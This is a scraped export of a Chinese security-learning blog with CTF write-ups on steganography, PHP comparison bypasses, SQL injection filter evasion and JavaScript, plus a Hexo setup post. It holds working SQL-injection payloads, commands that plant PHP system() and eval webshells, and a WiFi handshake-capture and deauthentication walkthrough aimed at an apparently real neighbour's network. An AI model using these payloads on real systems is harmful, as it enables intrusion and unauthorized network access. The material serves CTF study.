所以只需要在angrybird.jpg所在目录下运行下面语句即可(angrybird.jpg为所给图片) outguess -r angrybird.jpg outfile.txt Steganography Software F5题目提示刷新 即F5 git 下输入 git clone https://github.com/matthewgao/F5-steganographycd F5-steganographyjava Extract ../123456.jpg -p 123456 (123456.jpg为所给图片)后会生成output.txt文件，里面就有flag了 tweakpng + Adobe Fireworks CS5题目要对png文件格式有所了解 png格式主要由六大块组成：文件头、IHDR块、PLTE块、tRNS块、IDAT块、文件尾文件头一般是 8950 4E47 0D0A 1A0A而本题提示中的IHDR块是png中用来描述图片的基本信息，格式是4字节Chunk_Length、4字节Chunk_Type、13字节Chunk_Data、4字节Chunk_CRC Chunk_Length：内容一般是13，决定了Chunk_Data的大小Chunk_Type：内容为49484452，代表”IHDR”Chunk_Data：4字节Width,4字节Hegiht,1字节BitDepth,1字节ColorType,1字节CompressionMethod,1字节FilterMethod,1字节InterlaceMethodChunk_CRC：把Chunk_Type和Chunk_Data合起来进行CRC校验 把图片扔到tweakpng里 会提示crc 错误 并且告诉你正确的 crc 这时进入winhex改掉就行了 但是到这里还是看不到flag 如果放到ps里会提示 这就要下载 Adobe Fireworks CS5打开图片 就可以找到flag Audition结合摩斯密码音频文件扔到 Audition (flac格式直接读不出来 先格式工厂转换为 wav) 左上角的几种图像选择都试一试(红框里面的) 将会看到 摩斯密码型的长短结合的图案 对照摩斯密码表进行解密 Comfy File Repair 修复文件题目为一张损坏的 png 文件 发现文件头不对 查一下对应16进制文件头为 89 50 4E 47 0D 0A 1A 0A 修改即可 还可以使用 Comfy File Repair 自动修复 gnuplot 自动画图给出的图片 放入winhex后发现 FFD9后面还有很多东西 单独贴出来 扔到nodepad++ 选中plugins-&gt;converter-&gt;hex转asciii 看到是坐标值 -&gt; 画图 但是这里注意虽然在notepad++下是一行一个的 但是默认记事本打开是挤在一起的 先把括号替换为无 复制到 word文档再复制回来 最后逗号替换为空格 就可以得到可利用文本 把这个xy.txt放到你安装gnuplot路径的demo文件夹内 进入gnuplot 输入 plot “xy.txt” 把二维码剪出来用ps处理下大小和颜色 扫描即可 如果是三维坐标 要 splot “xx.txt”","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"这些年遇到的隐写题","slug":"这些年遇到的隐写题","date":"2017-08-21T01:42:36.000Z","updated":"2017-10-22T15:54:49.085Z","comments":true,"path":"2017/08/21/这些年遇到的隐写题/","link":"","permalink":"http://Merl1ng.com/2017/08/21/这些年遇到的隐写题/","excerpt":"misc 1题目是两张看起来一模一样的图片 首先都binwalk分析了下 没有什么异常","text":"misc 1题目是两张看起来一模一样的图片 首先都binwalk分析了下 没有什么异常这里也不是lsb隐写 但是还是要用到神器stegsolve 在 stegsolve里打开第一张图片 选择Analyse–Image Combiner 第二张图 合成两个图片 点左右箭头 当切换到 SUB 时发现二维码 save 保存(这里注意默认保存格式是bmp 需要改为png不然之后的二维码色阶过低扫不出来) 附bmp和png在后续操作后的对比图 观察二维码需要反色 在ps里 ctrl+i 反色 保存后再用 stegsolve 打开 左右箭头切换通道 可以看到三张十分清晰的二维码 分别扫描之 结果分别为DES6XaMMbM7U2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ/+lHBsjpv1BwwEawMo1c= 找一个解密网站解密 拿到 flag 这题纯用ps也能扫出来 但是操作比较繁琐 misc 2这道题比较容易一点 只记录重点的部分 在经过一些操作之后得到了一个a.gif文件 但是用winhex打开发现没有gif文件头导致文件打不开 在winhex增加文件头 查了一下是 47 49 46 38(edit -&gt; paste zero bytes -&gt;4)后来才知道直接notepad++ 打开 加上GIF8就行了 现在就可以查看图片了 但是图片播放速度过快 还是使用stegsolve analyse–frame browser 一帧一帧查看 (图片播放速度设置过慢也可以用这种方法) misc 3当发现所给图片感觉被强行截断 没有显示完全 (感觉显示完全其他方法不行也试一试..别问我为啥) 考虑是否被修改了图片分辨率即尺寸被缩小了 导致没有完全显示 明显感觉到该图片下面还有东西 放到winhex 图中红框内的分别代表图片的宽度和高度 将高度改大一点 比如改为05 00 看到了 flag 补充如果改完大小也没有 可能是因为与背景色重合了 win10默认图片打开方式背景色是黑的 如果flag也是黑的就看不到 所以还要试一试用画图打开 这时背景色是白色的 就能看到flag 比如这道题… 漆黑一片 misc 4挺复杂的一道题目 也使我对stegsolov的用法也有了更加深入的了解 原图是这个样子的 处理这个题目有两种方法 方法一打开后 调到blue plane 0 发现左上角有一行奇怪的东西 这时只勾选 blue 的最低位 和右边的lsb 看到 modernwarfare 再根据题目要求用md5加密就得到答案(modernwarfare是现代战争的意思 让我回想起了当年打coc的时光 ) 方法二这次不调到 blue 调到 gray bits 是的 也有一行东西 只不过这时要借助脚本提取 save 为solve.bmp 123456789from PIL import Imageflag_img = Image.open(\"solved.bmp\")w,h = flag_img.sizemsg=''for x in range(0, flag_img.size[1]): g,b,a = flag_img.getpixel((x,0)) if g==255: msg +='0' else: msg+='1'print msg 将二进制复制保存为 bin.txt(方便后续解码) 后记其实在 random color map 下会因为左右移动颜色的改变也显示出那一行东西 不知道能不能在那提取 misc 5发现有一堆文件 文件名为xaa–xcz winhex打开发现第一个文件头有png 就一行命令 Windows下切换到文件目录copy /B x* xx.png 将所有x打头文件以二进制方式复制，至xx.png FireWork打开图片，将二维码图层另存为其它文件，用QR Research软件即可识别 misc 6有时候 lsb 勾选column 比如这个 首先在 blue0 里发现奇怪的东西 猜测lsb 但是往常默认勾选 row 并无可利用内容 应该勾选 colume 看到了 key (原理真滴不清楚…s) misc 7题目如图 winhex打开发现以zip格式结尾 但此时binwalk不行 直接将图片格式改为zip 解压发现需要密码(当然这一步在winhex里搜索504b0304找到末尾的Zip头，然后贴出来，保存为zip也可以) 很显然图中信息就是密码 我这里直接根据图片内容猜测为8位纯数字或者四位字符(考虑ascii码) 爆破1s就出来了 当然试的话其实是把图片倒过来ascii码 但是YZ为啥互换不着… 解压得到txt 里面写着 42433331 这尼玛是什么… 后来才知道winhex做会误解 因为这其实是摩斯… 用010 editor 打开就很明显了 而那串数字就是分割方式 misc 8需要知识 gif 文件结尾为 003B 值为0x3B 符号为 ; 这题迷惑性蛮大的 图片是一个gif binwalk提示以zip结尾 winhex打开倒着看 有 nvshen.jpg显示出来 且发现有 504B0102 以为就是这里但是格式故意错了 改成504B0304却发现没用 原来事情没有这么简单 搜了一下504B发现有好几处 但其他地方不是0102 是比较乱的字符 又百度了一下504B0102 好像还真有这个 又看了一下后面有 3F00 1400 0100 很容易联想到伪加密 把0100 改成0000 又试了试 还不行 Orz.. 这里就必须要了解 gif的文件尾 winhex搜索 003B 找到 gif文件的结尾 并且这里 也显示了隐藏的图片 nvshen.jpg 原来最下面的那个是个幌子 看到了 love 要知道没有无缘无故的爱 这玩意估计是解压密码 love 即6C6F7665 后面是14000100 很符合zip 把love的hex 替换为 504B0304 就可以了 解压提示密码 即 love 就可以拿到隐藏的图片","categories":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/categories/misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"hbctf第十场writeup","slug":"hbctf第十场writeup","date":"2017-08-19T09:49:10.000Z","updated":"2017-08-31T02:44:36.085Z","comments":true,"path":"2017/08/19/hbctf第十场writeup/","link":"","permalink":"http://Merl1ng.com/2017/08/19/hbctf第十场writeup/","excerpt":"misc:flag.png给了一张png图","text":"misc:flag.png给了一张png图 winhex看看 png 头 再用 binwalk 也没看出来什么 虽然有zlib 但是由于png图片主体是由zlib压缩的 并不能直接确定(大多数情况下先忽略zlib) 当然这玩意也偶尔有用… 这时用脚本解压 1234567891011121314from PIL import Imagefrom zlib import * data = open('xxx.PNG','rb').read()[0x15AFFB:]data = decompress(data) img = Image.new('1', (25,25))d = img.load() for n,i in enumerate(data): d[(n%25,n/25)] = int(i)*255 f = open('1.png','wb')img.save(f) 回到此题猜测 lsb隐写 放到stegslove 先试试左右箭头查看RGB无果后选择 analyse Data extract按照图示选择save bin 再次放到winhex 显示 pk头 改后缀好压可以直接解压 得到 flag的后半部分 如果用的是winrar直接解压会报错 需要先点击修复选项 接下来寻找flag前半部分 利用后半部分的图片尝试lsb 这次明显不是再次binwalk (lsb得到的图片也叫 flag.png)发现其实有两个png图片用 binwalk “-D=png” flag.png得到flag前半部分 补充一道类似的lsb隐写题目拿到一张图 lsb隐写同样 save bin 但是这次显示的是 pt头 这时我们使用一个github上一个工具来处理-cloacked-pixe 然后使用命令python lsb.py extract 1.png 1.txt 123456可以得到隐写的文件1.txt。ps:extract指的是提取 1.png指的是导入文件名 （用原图）1.txt指的是导出文件名 123456指的是密码（此处根据题目的提示弱密码猜测） 具体参考 http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1 再补一个lsb的知识点如果所给图片格式不为png 比如是bmp等等这时在stegslove左右箭头查看RGB可能没有东西 可以先扔ps另存png 再用stegslove查看 没准就能看到 forensics:listen音频隐写题目 winhex打开文件头是 riff 搜了一下可能是 wav文件 结合题目listen 将后缀改为 wav听了一下贼刺耳又搜到 可能是音频倒放专门去下载了 Adobe Audition 倒放了一下试试 结果啥都没 正确解法去kailsox -t wav transmission -esigned-integer -b16 -r 22050 -t raw - | multimon-ng -A –得到flag 出题人给的生成方法 ./ax25beacon -s “WDPX01” -o transmission – 37.780963 -122.392227 0","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"php弱匹配和json","slug":"php弱匹配和json","date":"2017-08-12T16:17:39.000Z","updated":"2017-09-01T05:11:37.552Z","comments":true,"path":"2017/08/13/php弱匹配和json/","link":"","permalink":"http://Merl1ng.com/2017/08/13/php弱匹配和json/","excerpt":"其实很早就了解过php弱类型匹配 最近在看以前的writeup时又遇到了结合ctf总结一下","text":"其实很早就了解过php弱类型匹配 最近在看以前的writeup时又遇到了结合ctf总结一下 在PHP中有两种比较方式 == 和 === == 在使用时会出现一些问题如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 1234567var_dump(\"admin\"==0); var_dump(\"1admin\"==1); var_dump(\"admin1\"==0);var_dump('some string' == 0);var_dump('123fg456'==123);var_dump(123.0 == '123d456');var_dump(\"1\" == \"01\"); 进行hash比较的时候同样12var_dump(\"0e123456\"==\"0e4456789\");var_dump(\"1\" == \"1e0\"); 还存在一种十六进制余字符串进行比较运算时的问题当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较，0x1240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等12var_dump(\"0x1e240\"==\"123456\");var_dump(\"0x1e240\"==123456); 这些代码的输出结果全是bool(true) (var_dump() 能打印出类型) ctf中的运用 md5绕过12345678910111213141516&lt;?phpif (isset($_GET['Username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $Username = $_GET['Username']; $password = $_GET['password']; if (!ctype_alpha($Username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($Username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo \"successful\"; &#125;else&#123; echo \"login failed!\"; &#125; &#125;?&gt; 题目大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过 json绕过123456789101112131415&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key =\"*********\"; if ($message-&gt;key == $key) &#123; echo \"flag\"; &#125; else &#123; echo \"fail\"; &#125; &#125; else&#123; echo \"~~~~\"; &#125;?&gt; 输入一个json类型的字符串，json_decode函数解密，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过 最终payload message={“key”:0} 补充 json_decodejson_decode(PHP 5 &gt;= 5.2.0, PECL json &gt;= 1.2.0) json_decode — 对 JSON 格式的字符串进行编码 说明mixed json_decode ( string $json [, bool $assoc ] )接受一个 JSON 格式的字符串并且把它转换为 PHP 变量参数json待解码的 json string 格式的字符串。assoc当该参数为 TRUE 时，将返回 array 而非 object 例子12345&lt;?php $json = '&#123;\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5&#125;'; var_dump(json_decode($json)); var_dump(json_decode($json, true)); ?&gt; 将输出123456789101112131415object(stdClass)#1 (5) &#123; [\"a\"] =&gt; int(1) [\"b\"] =&gt; int(2) [\"c\"] =&gt; int(3) [\"d\"] =&gt; int(4) [\"e\"] =&gt; int(5) &#125; array(5) &#123; [\"a\"] =&gt; int(1) [\"b\"] =&gt; int(2) [\"c\"] =&gt; int(3) [\"d\"] =&gt; int(4) [\"e\"] =&gt; int(5) &#125; strcmp漏洞绕过 php -v &lt;5.312345678910&lt;?php $password=\"***************\" if(isset($_POST['password']))&#123; if (strcmp($_POST['password'], $password) == 0) &#123; echo \"Right!!!login success\";n exit(); &#125; else &#123; echo \"Wrong password..\"; &#125;?&gt; strcmp是比较两个字符串，如果str1","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"},{"name":"json","slug":"json","permalink":"http://Merl1ng.com/tags/json/"}]},{"title":"hexo自定义主页","slug":"hexo自定义主页","date":"2017-08-10T08:34:10.000Z","updated":"2017-08-19T09:50:10.669Z","comments":true,"path":"2017/08/10/hexo自定义主页/","link":"","permalink":"http://Merl1ng.com/2017/08/10/hexo自定义主页/","excerpt":"一直就想给博客加个自己的首页看到了喜欢的特效就毫不犹豫的动手了","text":"一直就想给博客加个自己的首页看到了喜欢的特效就毫不犹豫的动手了 其实如果有云服务器就不用这么麻烦了 以下操作前提是在github的博客 首先有一个自己的域名 并且解析到你已经搭建好的github博客地址 (yourname.github.io) 新建一个repository 这里我命名为 Home-page根据提示在git下复制代码进去 到域名注册的地方新增一个二级域名解析 同样指向你的github博客地址然后在Home-page新建文件CNAME 把你的二级域名写进去 Home-page里到setting 再到 github page 新建一个页面 此时将指向你的二级域名 把你喜欢的首页改名为index.html放到 Home-page 里面 (首页里超链接指向博客 废话)index文件里引用的css jpg等等 直接放到云上比较方便 然后把herf改成外链 到这里你的自定义首页就完成了我这里首页是 blog.merl1ng.cc 博客是 merl1ng.cc 但是问题又来了 因为是先绑的顶级域名 首页和博客的域名交换一下比较好 这里域名的解析不用改 只用到github上把两个仓库根目录的CNAME文件里的域名交换一波把index.html里的超链接改一下(不改一直指向自己)最后把本地hexo文件夹的source里的CNAME域名也改一下就完成了 最终的效果 首页为 merl1ng.cc 博客 blog.merl1ng.cc这样看起来比较舒服(≧∇≦)ﾉ 将来如果再新建别的二级域名 这个格式也比较方便","categories":[{"name":"setting","slug":"setting","permalink":"http://Merl1ng.com/categories/setting/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://Merl1ng.com/tags/hexo/"}]},{"title":"wifi破解","slug":"wifi破解","date":"2017-08-07T15:47:44.000Z","updated":"2017-08-13T06:12:04.063Z","comments":true,"path":"2017/08/07/wifi破解/","link":"","permalink":"http://Merl1ng.com/2017/08/07/wifi破解/","excerpt":"订的tl-wn722n网卡终于到了 插上用了一下在kail下确实免驱 根据教程抓到了握手包 但是字典不够大 没把密码跑出来","text":"订的tl-wn722n网卡终于到了 插上用了一下在kail下确实免驱 根据教程抓到了握手包 但是字典不够大 没把密码跑出来在虚拟机中的可移动设备上连接该网卡首先 airmon-ng 检测是否正常识别 开启网卡监听模式 airmon-ng start wlan0 开始扫描周围AP即wifi信号 airodump-ng wlan0mon 选择一个wifi 记录BSSID和CH这里我选的是附近信号较强的名为 决战到天亮 (图中显示有点乱码) 发起攻击并写入握手包文件输入airodump-ng -c 1 –bssid 70:AF:6A:93:7A:17 -w /root/Desktop wlan0mon 会在下方出现 路由器的mac 和客户端的mac 进行记录 (测试中有出现过不显示的情况)同时打开另外一个终端 强制用户断开wifi重连输入 aireplay-ng -0 6 -a 70:AF:6A:93:7A:17 -c 84:D8:AC:23:CA:65 wlan0mon(即上述记录的两个mac) 当出现WPA handshake 即代表握手包抓取成功 这时之前的监听可以关了(airmon-ng stop wlan0mon关闭网卡监听模式) 将字典放在同一目录下输入aircrack-ng -w z1.txt Desktop-*.cap (z1.txt为字典) 开始破解能不能跑出来就看字典大小了 最好提前社工一波","categories":[{"name":"lan","slug":"lan","permalink":"http://Merl1ng.com/categories/lan/"}],"tags":[{"name":"wifi","slug":"wifi","permalink":"http://Merl1ng.com/tags/wifi/"}]},{"title":"php结合sql注入","slug":"php结合sql注入","date":"2017-08-03T11:19:17.000Z","updated":"2017-08-03T13:30:25.941Z","comments":true,"path":"2017/08/03/php结合sql注入/","link":"","permalink":"http://Merl1ng.com/2017/08/03/php结合sql注入/","excerpt":"利用sql注入不仅能够查找数据库中指定数据 获取flag在渗透网站时利用sql结合php语句注入拿到shell","text":"利用sql注入不仅能够查找数据库中指定数据 获取flag在渗透网站时利用sql结合php语句注入拿到shell php注入漏洞使用sql语句漏洞 需要先了解php注入漏洞 PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz! DedeCMS等都曾经存在过该类型漏洞 System：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下： string system(string command, int &amp;return_var) 其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。 按照PHP程序员的想法，命令执行函数的主要作用是可以通过命令执行函数与Web应用程序进行交互，通过Web应用程序执行外部程序或系统命令，如Web应用程序员想通过system函数获取指定目录的文件内容，那么他可以通过构造如下代码实现php页面有如下代码 &lt;? $cmd = $_GET[&quot;cmd&quot;];echo &quot;&lt;pre&gt;&quot;;system($cmd);echo &quot;&lt;/pre&gt;&quot;;?&gt; 而我们就可以在浏览器中访问该网站的这个php文件 并提交cmd的内容为“net start” 目的是通过命令注入攻击查看Web服务器主机都开启了哪些服务提交cmd内容为“phpinfo()” 查看当前php环境相关信息 在PHP中，可以实现执行外部程序或函数的命令执行函数包括5个函数 除了上面列出的这种 还有几种就不一一列举 结合sql语句拿shell渗透过程中如果发现网站使用了PhpMyAdmin 可以找到执行sql语句的地方还需要查看服务器信息 得到网站的路径假设网站路径为C:/UPUPW/UPUPW_K2.1_64/htdocs 写入如下代码12select load_file('C:/UPUPW/UPUPW_K2.1_64/htdocs/log.php');select '&lt;?php echo \\'&lt;pre&gt;\\';system($_GET[\\'cmd\\']); echo \\'&lt;/pre&gt;\\'; ?&gt;' INTO OUTFILE 'C:/UPUPW/UPUPW_K2.1_64/htdocs/log.php' 拿到cmd权限 现在只要在cmd=后面加上命令即可写入一句话再连接菜刀即可写入 echo ^&lt;^?php eval($_POST[qaq]);?^&gt;^ &gt;&gt;aa.php通过执行以下命令，即可在当前目录下产生一个文件名为aa.php。密码为qaq的webshell 参考文章http://www.rising.com.cn/newsletter/news/2012-06-27/11810.htmlhttps://www.server110.com/web_sec/201407/10799.html","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://Merl1ng.com/tags/sql/"},{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"若干sql注入","slug":"若干sql注入","date":"2017-08-02T14:56:28.000Z","updated":"2018-03-08T14:10:48.596Z","comments":true,"path":"2017/08/02/若干sql注入/","link":"","permalink":"http://Merl1ng.com/2017/08/02/若干sql注入/","excerpt":"正在学习sql注入 差不多完整理解了一些注入题把方法和思路记录下来(&gt;ω&lt;)","text":"正在学习sql注入 差不多完整理解了一些注入题把方法和思路记录下来(&gt;ω&lt;) Sql 1首先提交1 即?id=1 得到ID: 1name: baloteli 提交1’ 报错 near ‘’1’’’说明单引号影响了语句 且sql语句中id值两旁有 ‘ ‘ -&gt;要闭合单引号网页中SELECT语句大致语法为 SELECT * FROM users WHERE id = ‘$id’ 然后提交 1’or ‘’=’得到ID: 1’ or ‘’=’name: baloteliID: 1’ or ‘’=’name: kanawaluoID: 1’ or ‘’=’name: dengdeng即分别提交 1 2 3 所显示的消息并且可以得知 or没有被过滤 试下and关键字两种写法 (为了闭合单引号) (两种写法只做一个简单的比较)1&#39; and &#39;1&#39;=&#39;1 没反应1&#39; and 1=1 or&#39;&#39;=&#39; 报错第一种更简洁 但是第二种回显效果更好说明and被过滤 1&#39; /*and*/ &#39;1&#39;=&#39;11&#39; /*and*/ 1=1 or&#39;&#39;=&#39;均同上 说明还是不行 and被过滤 1&#39; /*!and*/ &#39;1&#39;=&#39;1只回显了id为1的值1&#39; /*!and*/ 1=1 or&#39;&#39;=&#39; 回显了id为1 2 3的值成功绕过 猜表名?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ admin) /*!and*/ &#39;&#39;=&#39;报错Table ‘web10.admin’ doesn’t exist换flag猜下?id=&#39; or /*!exists*/ (/*!select*/ * /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;可以，那么就猜列名?id=&#39; or /*!exists*/ (/*!select*/ id /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;?id=&#39; or /*!exists*/ (/*!select*/ name /*!from*/ flag) /*!and*/ &#39;&#39;=&#39;都可以 联合查询 加上/*!where*/ &#39;&#39;=&#39;是为了闭合单引号?id=&#39; /*!union*/ /*!select*/ 1,2 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;报错The used SELECT statements have a different number of columns?id=&#39; /*!union*/ /*!select*/ 1 /*!from*/ flag /*!where*/ &#39;&#39;=&#39;可以 所以当前表只查找一列 ?id=&#39; /*!union*/ /*!select*/ name /*!from*/ flag /*!where*/ &#39;&#39;=&#39;报错Unknown column ‘name’ in ‘field list’这里比较奇怪 明明之前exists判断出有name列 结果这里联合就报没有这个name列 实际这道题是过滤了关键字后紧挨空格的情况所以可以双写空格关键字绕过 最终的查询语句为&#39;unionunion selectselect flag fromfrom flag wherewhere &#39;&#39;=&#39;或者&#39; /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &#39;&#39;=&#39; 后记 这个题还有比较奇怪的一点是不能用注释 注释掉后面的 ‘&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--+&#39; /*!union*/ /*!select*/ flag /*!from*/ flag#都不行 可能也进行了过滤 Sql 2 空格过滤这题过滤了空格.. 可以用/**/代替空格 ?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1 Sql 3 xss过滤题目 由题目源码可知 存在sql关键词过滤，存在xss过滤 可以知道strip_tags（）函数会过剥去字符串中的 HTML 标签 所以在sql关键词中插入HTML标签绕过sql过滤，然后通过xss过滤删去HTML标签 http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 1%23 http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 2%23 http://103.238.227.13:10087/?id=1 o&lt;&gt;rder by 3%23 发现表只有两列 这步也可以这样http://103.238.227.13:10087/?id=1 un&lt;&gt;ion se&lt;&gt;lect 1,2%23 http://103.238.227.13:10087/?id=1 un&lt;&gt;ion se&lt;&gt;lect database(),2%23拿到数据库名 sql3 http://103.238.227.13:10087/index.php?id=1 un&lt;&gt;ion se&lt;&gt;lect hash,1 fro&lt;&gt;m sql3.key%23 这里se&lt;&gt;lect * from 也阔以 或者 keyhttp://103.238.227.13:10087/index.php?id=1 un&lt;&gt;ion se&lt;&gt;lect hash,1 fro&lt;&gt;m key%23 `` 解释 假设第一个from是字段名，最后的table也是字段名，但是同时也是mysql关键字，这样执行的时候就会报错，所以应该使用 select from from table 还有把&lt;&gt;改成%00也能绕过 sql 宽字节注入 有一个十分关键的点 查表的过程中会遇到问题，key既是字段名又是表明会产生冲突，我们要用 来包含住 或者也可以用 库名.表名 形式 .DS_Store 泄露emmmm为啥把这玩意放在sql注入这里呢 因为这破题题目就叫sql注入 结果却是 .DS_Store 泄露 这个故事告诉我们 不管什么web题 先扫一遍目录总没错……….. 答案就躺在 flag 文件里 sql约束攻击细节可看这篇文章http://www.freebuf.com/articles/web/124537.html 我的理解是 数据库里本来有个admin的用户 你不知道它的密码 但是你去注册一个 admin 1 中间空好长的用户 设置一个密码 你就可以用你这个密码去登陆admin的账户","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://Merl1ng.com/tags/sql/"}]},{"title":"javascript伪协议与作用域","slug":"javascript伪协议与作用域","date":"2017-07-30T06:56:32.000Z","updated":"2017-07-30T12:48:16.868Z","comments":true,"path":"2017/07/30/javascript伪协议与作用域/","link":"","permalink":"http://Merl1ng.com/2017/07/30/javascript伪协议与作用域/","excerpt":"javascript 伪协议将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行","text":"javascript 伪协议将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中 这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开 javascript:alert(&quot;hello world!&quot;) javascript:window.history.forward(1)实现禁止浏览器后退 (hbctf里刚遇到的) 一般说来，伪协议经常被用到&lt;a&gt;的href属性上，例如&lt;a javascript:alert(&#39;hello&#39;);&quot;&gt;。这样，点击此链接的默认行为就是弹出一个框，而不是跳转至某页面了。此处需要注意的地方有两点： 1，返回值对浏览器行为的影响。返回undefined，停留在原页面，其它跳转至返回值。这就是为什么出现“false”页面的原因了。旧代码中能看到javascript:void(…);的写法，其实也是为了生成一个undefined的返回值，等同于在最后直接加return; 2，this指向global变量。这不是说例子中alert里的this是global变量，而是连href属性里的this是global变量。因为此处是默认行为，不是事件，所以里面的代码的执行上下文不是触发元素。 伪协议还可以使用在form元素的action里，行为和使用在anchor上一样 “javascript:void(0)”为什么需要javascript:void(0)? 答案:a标签如果不加href属性，就不会有链接样式，所以必须要加href属性，如果href=”#”，那么点击会跳转到首页 所以需要一个点了没反应的开发方法 ，那就是用href=”javascript:void(0)”—javascript:void(0)仅仅表示一个死链接，点击了什么也不会发生—但注意，javascript:void(expression) 不是一个死链接，如果有表达式，或者元素绑定了事件，点击后会执行表达式，或者执行绑定事件—href=“#”中#包含了一个位置信息默认的锚是#top 也就是网页的上端，这就是为什么有的时候页面很长浏览链接明明是#，但是却跳动到了页首 void是javascipt自身的操作符，它表示的是只执行表达式，但没有返回值表示不作任何操作，这样会防止链接跳转到其他页面 可以使用void操作符指定超级链接，如javascript：void(document.form.submit())。表达式会被计算但是不会在当前文档处装入任何内容，void(0)计算为0，但在JavaScript上没有任何效果，也就是说&lt;a href=&quot;javascript：void(0)&quot;&gt;的效果同&lt;a href=&quot;javascript：void(1)&quot;&gt;的效果是一样的 这么做往往是为了保留链接的样式，但不让链接执行实际操作，具体的操作交给链接的onclick事件处理 比如1.&lt;a href=&quot;javascript：void(0)&quot; onclick=&quot;doSomething()&quot;&gt;test&lt;/a&gt; 2.&lt;a href=&quot;#&quot; onclick=&quot;doSomething();return false;&quot;&gt;什么问题都解决了,包括浏览器不兼容问题&lt;/a&gt; //或者直接使用href=”” 3.&lt;a href=&quot;#&quot; onclick=&quot;alert();event.returnValue=false;&quot;&gt;test&lt;/a&gt; 其它与”javascript:void(0)”同作用的写法&lt;a href=&quot;#&quot;&gt;&lt;/a&gt; 点击这个链接后，会让页面跳到页面顶部，在location.href后面增加#号 &lt;a href=&quot;#none&quot;&gt;&lt;/a&gt;点击这个链接后， 如果页面里面有id为none的元素，会执行锚点机制跳转到这个元素上缘 &lt;a href=&quot;###&quot;&gt;&lt;/a&gt; 不跳转，可以阻止默认的跳转行为，但是这个在后端代码中容易识别成注释，后面的代码不显示——-下面用了伪协议——– &lt;a href=&quot;javascript:&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:void(0)&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript :void(0);&quot;&gt;&lt;/a&gt; 其中没写分号的 在IE6下面点击a标签 会造成页面中的gif暂停 javascript 作用域if、try、for等语句并不会产生新的作用域 python 也是 想产生作用域 -&gt; 闭包","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://Merl1ng.com/tags/javascript/"}]},{"title":"hbctf第九场writeup","slug":"hbctf第九场writeup","date":"2017-07-29T13:25:26.000Z","updated":"2017-08-25T12:32:40.372Z","comments":true,"path":"2017/07/29/hbctf第九场writeup/","link":"","permalink":"http://Merl1ng.com/2017/07/29/hbctf第九场writeup/","excerpt":"第一次比赛拿到排名 有点小激动 整理一下完成这篇write up顺便膜一波出题大佬","text":"第一次比赛拿到排名 有点小激动 整理一下完成这篇write up顺便膜一波出题大佬 签到题原页面pact.cc/xxoo/ 即pact.cc/xxoo/index.php 点击按钮 页面跳转到 pact.cc/xxoo/1ndex.php（刚开始我还以为浏览器不区分1和i…） F12看看代码里没什么奇怪的东西 控制台里也没有(就有一行这个比较在意 查了一下功能是禁止浏览器后退 javascript:window.history.forward(1);)响应里也没有奇奇怪怪的地方 这题也无法提交数据把post改成get试了试也没什么用 猜测只能Burp抓包分析 又因为是签到题直接 forward 就看到flag放到Repeater里 go 也可以（不关拦截） 这题其实点击按钮就有flag但是浏览器自动跳转到下一个页面看不到 所以要抓包 misc下载文件 文件名为 PwdIs4 